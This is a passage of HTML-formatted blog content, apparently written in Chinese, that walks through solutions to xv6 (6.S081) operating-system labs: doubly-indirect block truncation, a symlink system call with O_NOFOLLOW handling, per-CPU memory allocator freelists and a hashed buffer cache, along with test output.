class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">itrunc(struct inode *ip)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">int</span> i, j, k;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp</span>, *<span class="title">nbp</span>;</span></span><br><span class="line">  uint *a, *na;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NDIRECT; i++){</span><br><span class="line">    <span class="keyword">if</span>(ip-&gt;addrs[i]){</span><br><span class="line">      bfree(ip-&gt;dev, ip-&gt;addrs[i]);</span><br><span class="line">      ip-&gt;addrs[i] = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ip-&gt;addrs[NDIRECT]){</span><br><span class="line">    bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT]);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; NINDIRECT; j++){</span><br><span class="line">      <span class="keyword">if</span>(a[j])</span><br><span class="line">        bfree(ip-&gt;dev, a[j]);</span><br><span class="line">    }</span><br><span class="line">    brelse(bp);</span><br><span class="line">    bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT]);</span><br><span class="line">    ip-&gt;addrs[NDIRECT] = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ip-&gt;addrs[NDIRECT+<span class="number">1</span>]){</span><br><span class="line">    bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT+<span class="number">1</span>]);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; NINDIRECT; j++){</span><br><span class="line">      <span class="comment">// level1</span></span><br><span class="line">      <span class="keyword">if</span>(a[j]) {</span><br><span class="line">        nbp = bread(ip-&gt;dev, a[j]);</span><br><span class="line">        na = (uint*)nbp-&gt;data;</span><br><span class="line">        <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; NINDIRECT; k++) {</span><br><span class="line">          <span class="comment">// level2</span></span><br><span class="line">          <span class="keyword">if</span>(na[k]) {</span><br><span class="line">            bfree(ip-&gt;dev, na[k]);</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        bfree(ip-&gt;dev, a[j]);</span><br><span class="line">        brelse(nbp);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    brelse(bp);</span><br><span class="line">    bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT+<span class="number">1</span>]);</span><br><span class="line">    ip-&gt;addrs[NDIRECT+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  ip-&gt;<span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">  iupdate(ip);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行<code>bigfile</code>测试，看到测试创建了一个size为<code>65803</code>个block的最大文件。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ bigfile</span><br><span class="line">..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">wrote 65803 blocks</span><br><span class="line">bigfile <span class="keyword">done</span>; ok</span><br></pre></td></tr></tbody></table></figure><h1 id="Symbolic-links"><a href="#Symbolic-links" class="headerlink" title="Symbolic links"></a>Symbolic links</h1><p>这次我们需要实现一个<code>syscall</code>，用于创建符号连接，符号链接不会增加实际文件<code>inode</code>的link数，只是使用路径指向被link的文件。</p><p>首先，按照之前熟悉的方法添加新的<code>syscall</code>。</p><p>在<code>kernel/stat.h</code>中添加符号文件类型：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_SYMLINK 4</span></span><br></pre></td></tr></tbody></table></figure><p>在<code>kernel/fcntl.h</code>中添加：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_NOFOLLOW 0x800</span></span><br></pre></td></tr></tbody></table></figure><p>用于标识是要读取符号文件本身还是符号链接指向的文件。</p><p>之后我们实现<code>symlink</code>本身：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line">sys_symlink(<span class="keyword">void</span>) {</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> target[MAXPATH], path[MAXPATH];;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argstr(<span class="number">0</span>, target, MAXPATH) &lt; <span class="number">0</span>|| argstr(<span class="number">1</span>, path, MAXPATH) &lt; <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  begin_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ip = create(path, T_SYMLINK, <span class="number">0</span>, <span class="number">0</span>)) == <span class="number">0</span>){</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">int</span> len = <span class="built_in">strlen</span>(target);</span><br><span class="line">  <span class="comment">// write target path len</span></span><br><span class="line">  <span class="keyword">if</span>(writei(ip, <span class="number">0</span>, (uint64)&amp;len, <span class="number">0</span>, <span class="keyword">sizeof</span>(len)) &lt; <span class="keyword">sizeof</span>(len)) {</span><br><span class="line">    iunlockput(ip);</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// write target path</span></span><br><span class="line">  <span class="keyword">if</span>(writei(ip, <span class="number">0</span>, (uint64)target, <span class="keyword">sizeof</span>(len), len + <span class="number">1</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">    iunlockput(ip);</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  iunlockput(ip);</span><br><span class="line">  end_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先我们为符号文件创建一个新的<code>inode</code>，然后向其数据区写入指向的目标。在写入目标时，使用了<code>[len, target]</code>的格式，方便我们之后能准确地从文件系统中读取出<code>target</code>。</p><p>然后，我们需要修改<code>sys_open</code>，使之正确的处理符号文件。</p><blockquote><ul><li>Modify the <code>open</code> system call to handle the case where the path refers to a symbolic link. If the file does not exist, <code>open</code> must fail. When a process specifies <code>O_NOFOLLOW</code> in the flags to <code>open</code>, <code>open</code> should open the symlink (and not follow the symbolic link).</li><li>If the linked file is also a symbolic link, you must recursively follow it until a non-link file is reached. If the links form a cycle, you must return an error code. You may approximate this by returning an error code if the depth of links reaches some threshold (e.g., 10).</li></ul></blockquote><p>当没有设置<code>O_NOFOLLOW</code>时，<code>open</code>调用需要打开符号文件指向的真实文件，如果被符号文件指向的文件也是符号文件，则需要递归查找，指导找到真实文件。为了防止循环引用，当查找次数一定数值时，可以判断失败。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSYMLINK 10  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(omode &amp; O_NOFOLLOW)) {</span><br><span class="line">  <span class="keyword">int</span> cnt = MAXSYMLINK;</span><br><span class="line">  <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (cnt-- &gt; <span class="number">0</span>) {</span><br><span class="line">    ilock(ip);</span><br><span class="line">    <span class="keyword">if</span> (ip-&gt;type == T_SYMLINK) {</span><br><span class="line">      <span class="keyword">if</span> (readi(ip, <span class="number">0</span>, (uint64)&amp;len, <span class="number">0</span>, <span class="keyword">sizeof</span>(len)) &lt; <span class="keyword">sizeof</span>(len)) {</span><br><span class="line">        iunlockput(ip);</span><br><span class="line">        end_op();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> (readi(ip, <span class="number">0</span>, (uint64)path, <span class="keyword">sizeof</span>(len), len + <span class="number">1</span>) &lt; len + <span class="number">1</span>) {</span><br><span class="line">        iunlockput(ip);</span><br><span class="line">        end_op();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">      iunlockput(ip);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      iunlock(ip);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>((ip = namei(path)) == <span class="number">0</span>){</span><br><span class="line">      end_op();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (cnt &lt;= <span class="number">0</span>) {</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完整代码见<a href="https://github.com/Jason210314/xv6-labs-2020/tree/fs">GitHub仓库</a>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6.S081 </tag>
            
            <tag> file system </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.S081 lab8 lock</title>
      <link href="2021/03/01/6-s081-lab8-lock/"/>
      <url>2021/03/01/6-s081-lab8-lock/</url>
      
        <content type="html"><![CDATA[<p>在本实验室中，将重新设计代码以提高并行性。在多核机器上，并行性差的一个常见症状是高强度的锁竞争。提高并行性通常需要改变数据结构和加锁策略，以减少争用。您将对xv6内存分配器和文件块缓存进行改进。</p><a id="more"></a><h1 id="Memory-allocator"><a href="#Memory-allocator" class="headerlink" title="Memory allocator"></a>Memory allocator</h1><p><code>xv6</code>的内存分配与释放使用了一个全局锁<code>kmem.lock</code>，所有cpu想要分配和释放内存时，调用<code>kfree()</code>和<code>kalloc()</code>将对<code>kmem.lock</code>加锁，所以多线程同时获取和释放内存时，将造成激烈的锁竞争。本次实验将为每一个cpu实现单独的空闲内存链表，当一个cpu没有可用内存时，从另一个cpu“窃取”。</p><p>在改进之前，进行<code>kalloctest</code>：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ kalloctest</span><br><span class="line">start test1</span><br><span class="line">test1 results:</span><br><span class="line">--- lock kmem/bcache stats</span><br><span class="line">lock: kmem: <span class="comment">#fetch-and-add 134228 #acquire() 433016</span></span><br><span class="line">lock: bcache: <span class="comment">#fetch-and-add 0 #acquire() 1242</span></span><br><span class="line">--- top 5 contended locks:</span><br><span class="line">lock: kmem: <span class="comment">#fetch-and-add 134228 #acquire() 433016</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 39362 #acquire() 135295</span></span><br><span class="line">lock: virtio_disk: <span class="comment">#fetch-and-add 8435 #acquire() 114</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 4895 #acquire() 135334</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 3939 #acquire() 135337</span></span><br><span class="line">tot= 134228</span><br><span class="line">test1 FAIL</span><br><span class="line">start test2</span><br><span class="line">total free number of pages: 32499 (out of 32768)</span><br><span class="line">.....</span><br><span class="line">test2 OK</span><br></pre></td></tr></tbody></table></figure><p>可以看到<code>kmem</code>锁的“#fetch-and-add”数值（即自旋次数）非常高，锁竞争非常吉利。</p><p>需要注意：</p><blockquote><p>The function <code>cpuid</code> returns the current core number, but it’s only safe to call it and use its result when interrupts are turned off. You should use <code>push_off()</code> and <code>pop_off()</code> to turn interrupts off and on.</p></blockquote><p>修改<code>kmem</code>，<code>kinit()</code>，<code>kfree</code>，<code>kalloc</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">} kmems[NCPU];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> kbuf[NCPU][<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">kinit()</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NCPU; i++) {</span><br><span class="line">    <span class="built_in">snprintf</span>(kbuf[i], <span class="number">20</span>, <span class="string">"kmem%d"</span>, i);</span><br><span class="line">    initlock(&amp;kmems[i].lock, (<span class="keyword">char</span>*)kbuf[i]);</span><br><span class="line">  }</span><br><span class="line">  freerange(<span class="built_in">end</span>, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">kfree(<span class="keyword">void</span> *pa)</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; <span class="built_in">end</span> || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">"kfree"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct <span class="built_in">run</span>*)pa;</span><br><span class="line">  <span class="comment">// interrupt off</span></span><br><span class="line">  push_off();</span><br><span class="line">  <span class="keyword">int</span> cpu = cpuid();</span><br><span class="line">  acquire(&amp;kmems[cpu].lock);</span><br><span class="line">  r-&gt;next = kmems[cpu].freelist;</span><br><span class="line">  kmems[cpu].freelist = r;</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmems[cpu].lock);</span><br><span class="line">  <span class="comment">// interrupt on</span></span><br><span class="line">  pop_off();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">kalloc(<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  </span><br><span class="line">  push_off();</span><br><span class="line">  <span class="keyword">int</span> cpu = cpuid();</span><br><span class="line">  acquire(&amp;kmems[cpu].lock);</span><br><span class="line">  r = kmems[cpu].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmems[cpu].freelist = r-&gt;next;</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmems[cpu].lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// steal from other cpu </span></span><br><span class="line">  <span class="keyword">if</span>(!r) {</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NCPU; i++) {</span><br><span class="line">      <span class="keyword">if</span> (i == cpu)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      acquire(&amp;kmems[i].lock);</span><br><span class="line">      r = kmems[i].freelist;</span><br><span class="line">      <span class="keyword">if</span> (r) {</span><br><span class="line">        kmems[i].freelist = r-&gt;next;</span><br><span class="line">        <span class="built_in">release</span>(&amp;kmems[i].lock);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="built_in">release</span>(&amp;kmems[i].lock);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  pop_off();</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>修改后进行<code>kalloctest</code>：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ kalloctest</span><br><span class="line">start test1</span><br><span class="line">test1 results:</span><br><span class="line">--- lock kmem/bcache stats</span><br><span class="line">lock: kmem0: <span class="comment">#fetch-and-add 0 #acquire() 65683</span></span><br><span class="line">lock: kmem1: <span class="comment">#fetch-and-add 0 #acquire() 190628</span></span><br><span class="line">lock: kmem2: <span class="comment">#fetch-and-add 0 #acquire() 176734</span></span><br><span class="line">lock: bcache: <span class="comment">#fetch-and-add 0 #acquire() 1242</span></span><br><span class="line">--- top 5 contended locks:</span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 35310 #acquire() 112156</span></span><br><span class="line">lock: virtio_disk: <span class="comment">#fetch-and-add 11562 #acquire() 114</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 4717 #acquire() 112193</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 4242 #acquire() 112196</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 4058 #acquire() 112181</span></span><br><span class="line">tot= 0</span><br><span class="line">test1 OK</span><br><span class="line">start test2</span><br><span class="line">total free number of pages: 32499 (out of 32768)</span><br><span class="line">.....</span><br><span class="line">test2 OK</span><br></pre></td></tr></tbody></table></figure><p>可以看到<code>kmem</code>锁竞争消失了。</p><h1 id="Buffer-cache"><a href="#Buffer-cache" class="headerlink" title="Buffer cache"></a>Buffer cache</h1><p>在<code>xv6</code>中，使用<code>buffer cache</code>缓存一个磁盘<code>block</code>的内容，<code>bcache</code>使用一个锁来维护，每次<code>bget</code>和<code>brelse</code>都需要获取锁，这样将带来很激烈的锁竞争。</p><p>在修改前，<code>bcachetest</code>测试结果如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ bcachetest</span><br><span class="line">start test0</span><br><span class="line">test0 results:</span><br><span class="line">--- lock kmem/bcache stats</span><br><span class="line">lock: bcache: <span class="comment">#fetch-and-add 90245 #acquire() 65022</span></span><br><span class="line">--- top 5 contended locks:</span><br><span class="line">lock: virtio_disk: <span class="comment">#fetch-and-add 157311 #acquire() 1137</span></span><br><span class="line">lock: bcache: <span class="comment">#fetch-and-add 90245 #acquire() 65022</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 82586 #acquire() 73871</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 59647 #acquire() 73519</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 29617 #acquire() 73520</span></span><br><span class="line">tot= 90245</span><br><span class="line">test0: FAIL</span><br><span class="line">start test1</span><br><span class="line">test1 OK</span><br></pre></td></tr></tbody></table></figure><p>根据实验指导，我们将<code>bcache</code>的数据结构由一个双向链表改为<code>hashtable</code>，<code>bucket</code>数量使用素数来减少hash碰撞，其中<code>steal_lock</code>是整个<code>bcache</code>的大锁。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBUCKET 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>[<span class="title">NBUCKET</span>];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>[<span class="title">NBUCKET</span>];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">steal_lock</span>;</span></span><br><span class="line">} bcache;</span><br><span class="line"></span><br><span class="line">uint</span><br><span class="line">ihash(uint blockno) {</span><br><span class="line">  <span class="keyword">return</span> blockno % NBUCKET;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>修改初始化代码，将每个<code>bucket</code>指向的<code>buf</code>构造成双向循环链表，方便查找头尾，每次被释放的<code>buf</code>将被移到头部，以实现LRU，减少查找长度。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[NBUCKET][<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">binit(<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NBUCKET; i++) {</span><br><span class="line">    <span class="built_in">snprintf</span>(buf[i], <span class="number">20</span>, <span class="string">"bcache.bucket%d"</span>, i);</span><br><span class="line">    initlock(&amp;bcache.lock[i], (<span class="keyword">char</span>*)buf[i]);</span><br><span class="line">  }</span><br><span class="line">  initlock(&amp;bcache.steal_lock, <span class="string">"bcache"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NBUCKET; i++) {</span><br><span class="line">    <span class="comment">// create a circular linked list</span></span><br><span class="line">    <span class="comment">// head.next is the first elem</span></span><br><span class="line">    <span class="comment">// head.prev is the last(LRU) elem</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">head</span> = &amp;<span class="title">bcache</span>.<span class="title">head</span>[<span class="title">i</span>];</span></span><br><span class="line">    head-&gt;prev = head;</span><br><span class="line">    head-&gt;next = head;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="comment">// Average distribut buf to each bucket</span></span><br><span class="line">  <span class="keyword">for</span> (b = bcache.buf, i = <span class="number">0</span>; b &lt; bcache.buf + NBUF; b++, i = (i + <span class="number">1</span>) % NBUCKET) {</span><br><span class="line">    b-&gt;next = bcache.head[i].next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.head[i];</span><br><span class="line">    bcache.head[i].next-&gt;prev = b;</span><br><span class="line">    bcache.head[i].next = b;</span><br><span class="line">    initsleeplock(&amp;b-&gt;lock, <span class="string">"buffer"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>修改最关键的<code>bget</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 